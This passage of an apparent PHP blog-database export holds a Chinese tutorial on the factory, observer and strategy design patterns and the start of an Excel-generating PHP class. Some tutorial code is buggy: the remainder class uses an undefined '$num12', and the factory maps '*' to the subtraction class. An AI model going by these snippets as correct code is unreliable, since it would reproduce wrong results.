&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p><br/></p><p><strong style=\\"font-size: 14pt;\\" data-mce-style=\\"font-size: 14pt;\\"><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">通过采用面向对象的继承特性，我们可以很容易就能对原有程序进行扩展，比如:‘乘方’，‘开方’，‘对数’，‘三角函数’，‘统计’等，以还可以避免加载没有必要的代码。</span></strong></p><p>&nbsp;</p><p>如果我们现在需要增加一个求余的类，会非常的简单</p><p>我们只需要另外写一个类（该类继承虚拟基类）,在类中完成相应的功能（比如：求乘方的运算）,而且大大的降低了耦合度，方便日后的维护及扩展</p><pre>&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;求余类（remainder）
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;class&nbsp;OperationRem&nbsp;extends&nbsp;Operation&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getValue($num1,$num2){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$num1%$num12;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p><strong>现在还有一个问题未解决,就是如何让程序根据用户输入的操作符实例化相应的对象呢？<br/> 解决办法：使用一个单独的类来实现实例化的过程，这个类就是工厂</strong></p><pre>&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;工程类，主要用来创建对象
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;功能：根据输入的运算符号，工厂就能实例化出合适的对象
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;class&nbsp;Factory{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;function&nbsp;createObj($operate){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;($operate){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;+&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;OperationAdd();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;-&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;OperationSub();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;*&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;OperationSub();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;/&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;OperationDiv();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;$test=Factory::createObj(&#39;/&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;$result=$test-&gt;getValue(23,0);
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$result;</pre><p>其他关于关于此模式的笔记：</p><p><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">工厂模式：<br/><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">以交通工具为例子：要求请既可以定制交通工具，又可以定制交通工具生产的过程<br/><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">1&gt;定制交通工具<br/><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">&nbsp;&nbsp; &nbsp;1.定义一个接口，里面包含交工工具的方法（启动 运行 停止）<br/><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">&nbsp;&nbsp; &nbsp;2.让飞机，汽车等类去实现他们<br/><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">2&gt; 定制工厂（通上类似）<br/><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">&nbsp;&nbsp; &nbsp;1.定义一个接口，里面包含交工工具的制造方法（启动 运行 停止）<br/><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">&nbsp;&nbsp; &nbsp;2.分别写制造飞机，汽车的工厂类去继承实现这个接口</span></span></span></span></span></span></span></span></p><p>&nbsp;</p><p><strong><span style=\\"font-size: 14pt; color: #ff6600;\\" data-mce-style=\\"font-size: 14pt; color: #ff6600;\\">3.观察者模式</span></strong></p><p>&nbsp;观
 察者模式属于行为模式，是定义对象间的一种一对多的依赖关系，以便当一个对象的状态发生改变时，所有依 
赖于它的对象都得到通知并自动刷新。它完美的将观察者对象和被观察者对象分离。可以在独立的对象（主体）中维护一个对主体感兴趣的依赖项（观察器）列表。
 让所有观察器各自实现公共的 Observer 接口，以取消主体和依赖性对象之间的直接依赖关系。（反正我看不明白）</p><p><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">用到了 spl （standard php library） </span></p><p>&nbsp;</p><pre>class&nbsp;MyObserver1&nbsp;implements&nbsp;SplObserver&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;update(SplSubject&nbsp;$subject)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;__CLASS__&nbsp;.&nbsp;&#39;&nbsp;-&nbsp;&#39;&nbsp;.&nbsp;$subject-&gt;getName();
&nbsp;&nbsp;&nbsp;&nbsp;}
}
class&nbsp;MyObserver2&nbsp;implements&nbsp;SplObserver&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;update(SplSubject&nbsp;$subject)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;__CLASS__&nbsp;.&nbsp;&#39;&nbsp;-&nbsp;&#39;&nbsp;.&nbsp;$subject-&gt;getName();
&nbsp;&nbsp;&nbsp;&nbsp;}
}
class&nbsp;MySubject&nbsp;implements&nbsp;SplSubject&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$_observers;
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$_name;
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($name)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_observers&nbsp;=&nbsp;new&nbsp;SplObjectStorage();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_name&nbsp;=&nbsp;$name;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;attach(SplObserver&nbsp;$observer)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_observers-&gt;attach($observer);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;detach(SplObserver&nbsp;$observer)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_observers-&gt;detach($observer);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;notify()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($this-&gt;_observers&nbsp;as&nbsp;$observer)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$observer-&gt;update($this);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getName()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;_name;
&nbsp;&nbsp;&nbsp;&nbsp;}
}
$observer1&nbsp;=&nbsp;new&nbsp;MyObserver1();
$observer2&nbsp;=&nbsp;new&nbsp;MyObserver2();
$subject&nbsp;=&nbsp;new&nbsp;MySubject(&quot;test&quot;);
$subject-&gt;attach($observer1);
$subject-&gt;attach($observer2);
$subject-&gt;notify();</pre><p><strong><span style=\\"font-size: 14pt; color: #ff6600;\\" data-mce-style=\\"font-size: 14pt; color: #ff6600;\\">4.策略模式</span></strong></p><p><span style=\\"font-size: 12pt; font-family: Arial;\\" data-mce-style=\\"font-size: 12pt; font-family: Arial;\\">&nbsp;<span style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial;\\" data-mce-style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial;\\">在此模式中，<span style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial; color: red;\\" data-mce-style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial; color: red;\\">算法是从复杂类提取的<span style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial;\\" data-mce-style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial;\\">，因而可以<span style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial; color: red;\\" data-mce-style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial; color: red;\\">方便地替换<span style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial;\\" data-mce-style=\\"line-height: normal; text-align: left; font-size: 12pt; font-family: Arial;\\">。
 例如，如果要更改搜索引擎中排列页的方法，则策略模式是一个不错的选择。思考一下搜索引擎的几个部分 —— 
一部分遍历页面，一部分对每页排列，另一部分基于排列的结果排序。在复杂的示例中，这些部分都在同一个类中。通过使用策略模式，您可将排列部分放入另一个
 类中，以便更改页排列的方式，而不影响搜索引擎的其余代码。</span></span></span></span></span></span></p><p>&nbsp;</p><p><img src=\\"http://images.cnblogs.com/cnblogs_com/siqi/strategy.gif\\" alt=\\"\\" data-mce-src=\\"http://images.cnblogs.com/cnblogs_com/siqi/strategy.gif\\" height=\\"138\\" width=\\"309\\"/></p><p>&nbsp;</p><p>&nbsp;<span style=\\"font-family: arial, nsimsun, sans-serif; font-size: 12px; line-height: normal; text-align: left;\\" data-mce-style=\\"font-family: arial, nsimsun, sans-serif; font-size: 12px; line-height: normal; text-align: left;\\">作为一个较简单的示例，下面 显示了一个用户列表类，它提供了一个根据<span style=\\"font-family: arial, nsimsun, sans-serif; font-size: 12px; line-height: normal; text-align: left; color: red;\\" data-mce-style=\\"font-family: arial, nsimsun, sans-serif; font-size: 12px; line-height: normal; text-align: left; color: red;\\">一组即插即用的策略查找一组用户<span style=\\"font-family: arial, nsimsun, sans-serif; font-size: 12px; line-height: normal; text-align: left;\\" data-mce-style=\\"font-family: arial, nsimsun, sans-serif; font-size: 12px; line-height: normal; text-align: left;\\">的方法</span></span></span></p><pre class=\\"brush:php;toolbar:false\\">//定义接口
interface&nbsp;IStrategy&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;filter($record);
}

//实现接口方式1
class&nbsp;FindAfterStrategy&nbsp;implements&nbsp;IStrategy&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$_name;
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($name)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_name&nbsp;=&nbsp;$name;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;filter($record)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;strcmp&nbsp;(&nbsp;$this-&gt;_name,&nbsp;$record&nbsp;)&nbsp;&lt;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;}
}

//实现接口方式1
class&nbsp;RandomStrategy&nbsp;implements&nbsp;IStrategy&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;filter($record)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;rand&nbsp;(&nbsp;0,&nbsp;1&nbsp;)&nbsp;&gt;=&nbsp;0.5;
&nbsp;&nbsp;&nbsp;&nbsp;}
}

//主类
class&nbsp;UserList&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$_list&nbsp;=&nbsp;array&nbsp;();
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($names)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($names&nbsp;!=&nbsp;null)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;(&nbsp;$names&nbsp;as&nbsp;$name&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_list&nbsp;[]&nbsp;=&nbsp;$name;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;add($name)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_list&nbsp;[]&nbsp;=&nbsp;$name;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;find($filter)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$recs&nbsp;=&nbsp;array&nbsp;();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;(&nbsp;$this-&gt;_list&nbsp;as&nbsp;$user&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($filter-&gt;filter&nbsp;(&nbsp;$user&nbsp;))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$recs&nbsp;[]&nbsp;=&nbsp;$user;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$recs;
&nbsp;&nbsp;&nbsp;&nbsp;}
}

$ul&nbsp;=&nbsp;new&nbsp;UserList&nbsp;(&nbsp;array&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Andy&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Jack&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Lori&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Megan&quot;&nbsp;
)&nbsp;);
$f1&nbsp;=&nbsp;$ul-&gt;find&nbsp;(&nbsp;new&nbsp;FindAfterStrategy&nbsp;(&nbsp;&quot;J&quot;&nbsp;)&nbsp;);
print_r&nbsp;(&nbsp;$f1&nbsp;);

$f2&nbsp;=&nbsp;$ul-&gt;find&nbsp;(&nbsp;new&nbsp;RandomStrategy&nbsp;()&nbsp;);
print_r&nbsp;(&nbsp;$f2&nbsp;);</pre><p><span style=\\"color: #008080;\\" data-mce-style=\\"color: #008080;\\"><span style=\\"color: #800080;\\" data-mce-style=\\"color: #800080;\\"><br/><span style=\\"font-family: arial, nsimsun, sans-serif; font-size: 12px; line-height: normal; text-align: left;\\" data-mce-style=\\"font-family: arial, nsimsun, sans-serif; font-size: 12px; line-height: normal; text-align: left;\\">策略模式非常适合复杂数据管理系统或数据处理系统，二者在数据筛选、搜索或处理的方式方面需要较高的灵活性</span></span></span></p><p>&nbsp;</p><p><br/></p>',
            'keyword' => 'php,设计模式',
            'sortid' => '6',
            'img' => '',
            'views' => '2',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:50:01',
          ),
          57 => 
          array (
            'id' => '28',
            'uid' => '1',
            'title' => 'php生成excel',
            'content' => '<p><span style=\\"color: #000000;\\"><strong>1、用类生成</strong></span><br/></p><pre class=\\"brush:php;toolbar:false\\">&lt;?php

/**
&nbsp;*&nbsp;Simple&nbsp;excel&nbsp;generating&nbsp;from&nbsp;PHP5
&nbsp;*&nbsp;
&nbsp;*&nbsp;This&nbsp;is&nbsp;one&nbsp;of&nbsp;my&nbsp;utility-classes.
&nbsp;*&nbsp;
&nbsp;*&nbsp;The&nbsp;MIT&nbsp;License
&nbsp;*&nbsp;
&nbsp;*&nbsp;Copyright&nbsp;(c)&nbsp;2007&nbsp;Oliver&nbsp;Schwarz
&nbsp;*&nbsp;
&nbsp;*&nbsp;Permission&nbsp;is&nbsp;hereby&nbsp;granted,&nbsp;free&nbsp;of&nbsp;charge,&nbsp;to&nbsp;any&nbsp;person
&nbsp;*&nbsp;obtaining&nbsp;a&nbsp;copy&nbsp;of&nbsp;this&nbsp;software&nbsp;and&nbsp;associated&nbsp;documentation
&nbsp;*&nbsp;files&nbsp;(the&nbsp;&quot;Software&quot;),&nbsp;to&nbsp;deal&nbsp;in&nbsp;the&nbsp;Software&nbsp;without
&nbsp;*&nbsp;restriction,&nbsp;including&nbsp;without&nbsp;limitation&nbsp;the&nbsp;rights&nbsp;to&nbsp;use,
&nbsp;*&nbsp;copy,&nbsp;modify,&nbsp;merge,&nbsp;publish,&nbsp;distribute,&nbsp;sublicense,&nbsp;and/or
&nbsp;*&nbsp;sell&nbsp;copies&nbsp;of&nbsp;the&nbsp;Software,&nbsp;and&nbsp;to&nbsp;permit&nbsp;persons&nbsp;to&nbsp;whom&nbsp;the
&nbsp;*&nbsp;Software&nbsp;is&nbsp;furnished&nbsp;to&nbsp;do&nbsp;so,&nbsp;subject&nbsp;to&nbsp;the&nbsp;following
&nbsp;*&nbsp;conditions:
&nbsp;*
&nbsp;*&nbsp;The&nbsp;above&nbsp;copyright&nbsp;notice&nbsp;and&nbsp;this&nbsp;permission&nbsp;notice&nbsp;shall&nbsp;be
&nbsp;*&nbsp;included&nbsp;in&nbsp;all&nbsp;copies&nbsp;or&nbsp;substantial&nbsp;portions&nbsp;of&nbsp;the&nbsp;Software.
&nbsp;*&nbsp;
&nbsp;*&nbsp;THE&nbsp;SOFTWARE&nbsp;IS&nbsp;PROVIDED&nbsp;&quot;AS&nbsp;IS&quot;,&nbsp;WITHOUT&nbsp;WARRANTY&nbsp;OF&nbsp;ANY&nbsp;KIND,
&nbsp;*&nbsp;EXPRESS&nbsp;OR&nbsp;IMPLIED,&nbsp;INCLUDING&nbsp;BUT&nbsp;NOT&nbsp;LIMITED&nbsp;TO&nbsp;THE&nbsp;WARRANTIES
&nbsp;*&nbsp;OF&nbsp;MERCHANTABILITY,&nbsp;FITNESS&nbsp;FOR&nbsp;A&nbsp;PARTICULAR&nbsp;PURPOSE&nbsp;AND
&nbsp;*&nbsp;NONINFRINGEMENT.&nbsp;IN&nbsp;NO&nbsp;EVENT&nbsp;SHALL&nbsp;THE&nbsp;AUTHORS&nbsp;OR&nbsp;COPYRIGHT
&nbsp;*&nbsp;HOLDERS&nbsp;BE&nbsp;LIABLE&nbsp;FOR&nbsp;ANY&nbsp;CLAIM,&nbsp;DAMAGES&nbsp;OR&nbsp;OTHER&nbsp;LIABILITY,
&nbsp;*&nbsp;WHETHER&nbsp;IN&nbsp;AN&nbsp;ACTION&nbsp;OF&nbsp;CONTRACT,&nbsp;TORT&nbsp;OR&nbsp;OTHERWISE,&nbsp;ARISING
&nbsp;*&nbsp;FROM,&nbsp;OUT&nbsp;OF&nbsp;OR&nbsp;IN&nbsp;CONNECTION&nbsp;WITH&nbsp;THE&nbsp;SOFTWARE&nbsp;OR&nbsp;THE&nbsp;USE&nbsp;OR
&nbsp;*&nbsp;OTHER&nbsp;DEALINGS&nbsp;IN&nbsp;THE&nbsp;SOFTWARE.
&nbsp;*
&nbsp;*&nbsp;@package&nbsp;Utilities
&nbsp;*&nbsp;@author&nbsp;Oliver&nbsp;Schwarz&nbsp;&lt;oliver.schwarz@gmail.com&gt;
&nbsp;*&nbsp;@version&nbsp;1.0
&nbsp;*/

/**
&nbsp;*&nbsp;Generating&nbsp;excel&nbsp;documents&nbsp;on-the-fly&nbsp;from&nbsp;PHP5
&nbsp;*&nbsp;
&nbsp;*&nbsp;Uses&nbsp;the&nbsp;excel&nbsp;XML-specification&nbsp;to&nbsp;generate&nbsp;a&nbsp;native
&nbsp;*&nbsp;XML&nbsp;document,&nbsp;readable/processable&nbsp;by&nbsp;excel.
&nbsp;*&nbsp;
&nbsp;*&nbsp;@package&nbsp;Utilities
&nbsp;*&nbsp;@subpackage&nbsp;Excel
&nbsp;*&nbsp;@author&nbsp;Oliver&nbsp;Schwarz&nbsp;&lt;oliver.schwarz@vaicon.de&gt;
&nbsp;*&nbsp;@version&nbsp;1.0
&nbsp;*
&nbsp;&nbsp;*&nbsp;@todo&nbsp;Add&nbsp;error&nbsp;handling&nbsp;(array&nbsp;corruption&nbsp;etc.)
&nbsp;*&nbsp;@todo&nbsp;Write&nbsp;a&nbsp;wrapper&nbsp;method&nbsp;to&nbsp;do&nbsp;everything&nbsp;on-the-fly
&nbsp;*/
class&nbsp;ExcelNew
{

&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Header&nbsp;of&nbsp;excel&nbsp;document&nbsp;(prepended&nbsp;to&nbsp;the&nbsp;rows)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Copied&nbsp;from&nbsp;the&nbsp;excel&nbsp;xml-specs.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;private
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@var&nbsp;string
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$header&nbsp;=&nbsp;&quot;&lt;?xml&nbsp;version=\\\\&quot;1.0\\\\&quot;&nbsp;encoding=\\\\&quot;GBK\\\\&quot;?\\\\&gt;
&lt;Workbook&nbsp;xmlns=\\\\&quot;urn:schemas-microsoft-com:office:spreadsheet\\\\&quot;
&nbsp;xmlns:x=\\\\&quot;urn:schemas-microsoft-com:office:excel\\\\&quot;
&nbsp;xmlns:ss=\\\\&quot;urn:schemas-microsoft-com:office:spreadsheet\\\\&quot;
&nbsp;xmlns:html=\\\\&quot;http://www.w3.org/TR/REC-html40\\\\&quot;&gt;&quot;;

&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Footer&nbsp;of&nbsp;excel&nbsp;document&nbsp;(appended&nbsp;to&nbsp;the&nbsp;rows)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Copied&nbsp;from&nbsp;the&nbsp;excel&nbsp;xml-specs.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;private
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@var&nbsp;string
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$footer&nbsp;=&nbsp;&quot;&lt;/Workbook&gt;&quot;;

&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Document&nbsp;lines&nbsp;(rows&nbsp;in&nbsp;an&nbsp;array)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;private
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@var&nbsp;array
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$lines&nbsp;=&nbsp;array&nbsp;();
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$Index&nbsp;=&nbsp;1;

&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Worksheet&nbsp;title
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Contains&nbsp;the&nbsp;title&nbsp;of&nbsp;a&nbsp;single&nbsp;worksheet
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;private&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@var&nbsp;string
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$worksheet_title&nbsp;=&nbsp;&quot;Table1&quot;;

&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Add&nbsp;a&nbsp;single&nbsp;row&nbsp;to&nbsp;the&nbsp;$document&nbsp;string
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;private
